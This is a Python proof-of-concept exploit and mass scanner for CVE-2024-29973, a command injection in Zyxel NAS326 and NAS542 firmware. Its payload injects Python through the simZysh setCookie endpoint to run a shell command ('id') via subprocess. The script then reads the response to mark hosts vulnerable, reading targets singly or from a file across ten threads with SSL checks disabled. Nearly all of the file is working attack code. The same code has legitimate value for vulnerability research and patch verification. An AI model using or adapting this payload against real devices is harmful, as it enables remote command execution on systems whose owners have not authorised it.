"""

POC for CVE-2024-29973: Command injection vulnerability in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware versions before V5.21(ABAG.14)
Full details can be found at https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/

POC Author: x.com/MohamedNab1l                                                                             
GitHub: https://github.com/bigb0x/CVE-2024-29973

Usage:
    single scan: cve-2024-29973.py -u target
    bulk scan cve-2024-29973.py -f file.txt

"""
import requests
import argparse
import threading
import queue
import os
from requests.exceptions import RequestException
import re
from datetime import datetime
import urllib3

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
light_gray_color = '\033[37;1m'
dimmed_gray_color = '\033[90m'
honey_yellow_color = "\033[38;5;214m"
dim_yellow_color = "\033[33;1m"
cyan_color = '\033[96m'
green_color = '\033[92m'
red_color = '\033[31m'
light_orange_color = '\033[38;5;214m'
light_green_color = '\033[92m'
reset_color = '\033[0m'

def banner():
    print(f"""
{light_orange_color}

░█▀▀█ ░█──░█ ░█▀▀▀ ── █▀█ █▀▀█ █▀█ ─█▀█─ ── █▀█ ▄▀▀▄ ▄▀▀▄ ▀▀▀█ █▀▀█ 
░█─── ─░█░█─ ░█▀▀▀ ▀▀ ─▄▀ █▄▀█ ─▄▀ █▄▄█▄ ▀▀ ─▄▀ ▀▄▄█ ▀▄▄█ ──█─ ──▀▄ 
░█▄▄█ ──▀▄▀─ ░█▄▄▄ ── █▄▄ █▄▄█ █▄▄ ───█─ ── █▄▄ ─▄▄▀ ─▄▄▀ ─▐▌─ █▄▄█

  -> POC CVE-2024-29973 vulnerability
{reset_color}
    """)


LOG_DIR = 'logs'
LOG_FILE = os.path.join(LOG_DIR, 'scan.log')


def create_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        print_message('info', f"Log directory created: {LOG_DIR}")


def log_message(message):
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")


def print_message(level, message):
    if level == 'info':
        print(f"{cyan_color}[INFO] {message}{reset_color}")
    elif level == 'success':
        print(f"{green_color}[SUCCESS] {message}{reset_color}")
    elif level == 'warning':
        print(f"{honey_yellow_color}[WARNING] {message}{reset_color}")
    elif level == 'error':
        print(f"{red_color}[ERROR] {message}{reset_color}")
    log_message(message)

# payload
payload = (
    "GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+"
    "and+False+or+__import__(\"subprocess\").check_output(\"id\",+shell=True)%23 HTTP/1.1\r\n"
    "Host: {}\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/70.0.3538.77 Safari/537.36\r\n\r\n"
)


def test_host(url):
    try:
        hostname = url.split('//')[1]
        request_data = payload.format(hostname)
        response = requests.post(url, data=request_data, timeout=10, verify=False)
        
        if response.status_code == 200 and re.search(r'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)', response.text):
            print_message('success', f"Vulnerable: {url}")
        else:
            print_message('warning', f"Not Vulnerable: {url}")
    except RequestException as e:
        print_message('error', f"Timeout error: {url}")


def worker(queue):
    while not queue.empty():
        url = queue.get()
        print_message('info', f"Testing {url}")
        test_host(url)
        queue.task_done()


def main():
    banner()
    parser = argparse.ArgumentParser(description='Check for CVE-2024-29973 vulnerability.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target URL (e.g., http://example.com)')
    group.add_argument('-f', '--file', help='File containing list of URLs (one per line)')

    args = parser.parse_args()

    create_log_dir()

    if args.url:
        print_message('info', f"Testing single target: {args.url}")
        test_host(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print_message('info', f"Testing multiple targets from file: {args.file}")

        url_queue = queue.Queue()
        for url in urls:
            url_queue.put(url)

        threads = []
        for _ in range(10):
            t = threading.Thread(target=worker, args=(url_queue,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print_message('success', "Scanning complete.")

if __name__ == '__main__':
    main()
